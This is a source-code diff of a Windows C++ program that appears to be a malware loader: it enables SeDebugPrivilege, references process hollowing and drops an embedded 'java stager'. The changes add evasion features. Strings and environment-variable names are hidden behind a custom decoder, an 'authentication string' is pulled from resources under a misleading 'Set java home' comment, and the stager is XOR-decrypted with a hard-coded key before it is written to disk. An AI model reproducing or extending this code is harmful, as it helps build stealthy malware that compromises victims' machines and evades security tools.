@@ -7,6 +7,7 @@
 
 
 #pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "User32.lib")
 
 FILE * debug_file_handle = stdout;
 
@@ -476,6 +477,38 @@ int main(int argc, char* argv[])
 	std::string hollow_proc_str;
 	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);
 
+
+	//Set java home
+	//Get authentication string from resource table
+    char auth_str_buf[200];
+	LoadString(dll_handle, IDS_JVM_PATH, auth_str_buf, 200);
+	if( strlen( auth_str_buf ) != 0 ){
+
+		//Deobfuscate it
+		char *auth_ptr = decode_split(auth_str_buf, 200);
+		std::string authStr(auth_ptr);
+		free(auth_ptr);
+
+#ifdef _DBG
+		fprintf( debug_file_handle,"JVM Path: %s, Length: %d\n", authStr.c_str(), authStr.length());
+#endif
+
+		//Create an env variable with the name of the dll
+		//PS_HOME
+		char *java_home = decode_split("\x5\x0\x5\x3\x5\xf\x4\x8\x4\xf\x4\xd\x4\x5",14);
+		if (! SetEnvironmentVariable(java_home, authStr.c_str()) ) 
+		{
+	#ifdef _DBG
+			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+	#endif
+			free(java_home);
+			return 0;
+		}
+		//free mem
+		free(java_home);
+
+	}
+
 	
 	//Get the filename of the DLL
 	char module_name[MAX_PATH]; 
@@ -487,13 +520,18 @@ int main(int argc, char* argv[])
 
 
 	//Create an env variable with the name of the dll
-	if (! SetEnvironmentVariable("TMP", classPath.c_str()) ) 
+	//TMP
+	char *tmp = decode_split("\x5\x4\x4\xd\x5\x0",6);
+	if (! SetEnvironmentVariable(tmp, classPath.c_str()) ) 
     {
 #ifdef _DBG
 		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
 #endif
+		free(tmp);
         return 0;
     }
+	//Free mem
+	free(tmp);
 
 	//Extract java stager
 	if( !ExtractStager( classPath )){
@@ -578,14 +616,30 @@ bool ExtractStager( std::string passedPath){
 #endif
 			return false;
 		}
+
+		//Allocate memory
+		char *buf = (char *)malloc( dwSizeRes );
+		memcpy( buf, lpResLock, dwSizeRes );
+
+		//Decode XOR
+		char *xor_key = "\xa3\x45\x23\x06\xf4\x21\x42\x81\x72\x11\x92\x29";
+		int len = strlen(xor_key);
+
+		//XOR the data
+		for( DWORD i = 0; i < dwSizeRes; i++ )
+			buf[i] = buf[i] ^ xor_key[i % len];			
 		
 		
-		if( !WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL)){
+		if( !WriteFile(hStream, buf, dwSizeRes, &dwRet, NULL)){
 #ifdef _DBG
 			fprintf( debug_file_handle,"Unable to write java file.\r\n");
 #endif
+			free(buf);
 			return false;
 		}
+		//Free mem
+		free(buf);
+		
 
 		CloseHandle(hStream);
 	}
